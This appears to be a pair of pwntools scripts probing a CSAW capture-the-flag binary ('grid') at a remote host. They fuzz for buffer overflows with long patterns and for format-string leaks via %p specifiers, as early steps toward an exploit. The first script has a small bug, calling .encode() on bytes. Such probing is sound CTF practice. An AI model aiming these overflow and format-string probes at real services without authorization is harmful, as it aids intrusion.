#!/usr/bin/python3
from pwn import *
import sys

context.log_level = 'debug'

REMOTE = True

if REMOTE:
    p = remote('pwn.chal.csaw.io', 8000)
else:
    p = process('./grid')

def create_shape(shape, coords):
    p.sendline(shape.encode())
    p.recvuntil(b'loc>')
    p.sendline(coords.encode())
    return p.recvuntil(b'shape>', timeout=1)

def test_format_string(offset):
    fmt = f'%{offset}$p'
    coords = '0,15'  # Try writing near end of buffer
    log.info(f"Testing format string {fmt} at {coords}")
    result = create_shape(fmt, coords)
    return result

def test_buffer_overflow():
    # Try writing large patterns at different offsets to see buffer boundaries
    for i in range(10, 20):
        pattern = cyclic(16)  # Generate 16-byte pattern
        coords = f'0,{i}'     # Try different vertical positions
        log.info(f"Testing pattern at {coords}")
        try:
            result = create_shape(pattern, coords)
            log.info(hexdump(result))

            # Look for cyclic pattern in output (potential leak)
            if any(p in result for p in pattern):
                log.success(f"Found pattern leak at {coords}")

        except EOFError:
            log.failure(f"Program crashed at offset {i}")
            break

# First try buffer overflow to find boundaries
test_buffer_overflow()

# Then try format strings to leak values
for i in range(10, 30):
    try:
        result = test_format_string(i)
        if b'0x' in result:
            log.success(f"Potential leak at offset {i}: {result}")
    except:
        continue

p.close()

#!/usr/bin/python3
from pwn import *
import sys

context.log_level = 'debug'

REMOTE = True

if REMOTE:
    p = remote('pwn.chal.csaw.io', 8000)
else:
    p = process('./grid')

def create_shape(shape, coords):
    p.sendlineafter(b'shape>', shape.encode())
    p.sendlineafter(b'loc>', coords.encode())
    return p.recvuntil(b'shape>', timeout=1)

def test_buffer_overflow():
    # Let's try writing longer strings near the buffer boundary
    test_patterns = [
        ('A'*95, '0,0'),  # Write near end of buffer
        ('A'*96, '0,1'),  # Write at potential buffer end
        ('A'*97, '0,2'),  # Write past buffer
        ('A'*98, '0,3'),  # Write further past
        ('%p'*10, '0,4'), # Try format strings
        ('%llx'*5, '0,5'), # Try long format strings
    ]

    for pattern, coords in test_patterns:
        log.info(f"Testing pattern {len(pattern)} bytes at {coords}")
        result = create_shape(pattern, coords)
        if b'shape>' not in result or len(result) > 500:
            log.success(f"Possible overflow found with pattern length {len(pattern)}")
            log.info("Result:\n" + hexdump(result))

try:
    test_buffer_overflow()
except EOFError:
    log.failure("Program crashed")
finally:
    p.close()

